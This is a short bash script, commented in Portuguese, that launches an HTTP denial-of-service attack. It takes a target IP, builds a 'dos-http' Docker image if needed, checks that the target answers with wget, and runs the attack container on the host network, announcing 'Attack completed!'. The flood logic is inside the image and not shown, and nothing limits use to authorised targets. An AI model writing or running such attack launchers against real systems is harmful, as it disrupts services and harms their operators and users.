#!/bin/bash

# Script para executar ataque DoS HTTP
# Uso: ./run.sh <TARGET_IP>

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# Verifica se o IP foi fornecido
if [ -z "$1" ]; then
    echo "Usage: $0 <TARGET_IP>"
    echo ""
    echo "Example:"
    echo "  $0 192.168.1.100"
    echo "  $0 172.18.0.2"
    exit 1
fi

TARGET_IP="$1"

# Valida formato básico de IP
if ! [[ $TARGET_IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    echo "[ERROR] Invalid IP format: $TARGET_IP"
    exit 1
fi

echo "=========================================="
echo "  HTTP DoS/DDoS Attack"
echo "=========================================="
echo ""
echo "Target: $TARGET_IP"
echo ""

# Verifica se a imagem existe, se não, constrói
if ! docker image inspect dos-http > /dev/null 2>&1; then
    echo "[+] Building dos-http image..."
    docker build -t dos-http .
    echo ""
fi

# Testa conectividade básica antes do ataque
echo "[+] Testing connectivity to target..."
if docker run --rm --network host alpine sh -c "wget -q --spider --timeout=3 http://${TARGET_IP} 2>&1" > /dev/null 2>&1; then
    echo "[+] Target is reachable"
else
    echo "[WARN] Target may not be reachable or HTTP service not running"
    echo "[WARN] Continuing anyway..."
fi
echo ""

# Executa o ataque na rede do host (para comunicação com outras máquinas na rede)
echo "[+] Starting attack..."
docker run --rm \
    --network host \
    -e TARGET_IP="$TARGET_IP" \
    dos-http

echo ""
echo "[+] Attack completed!"

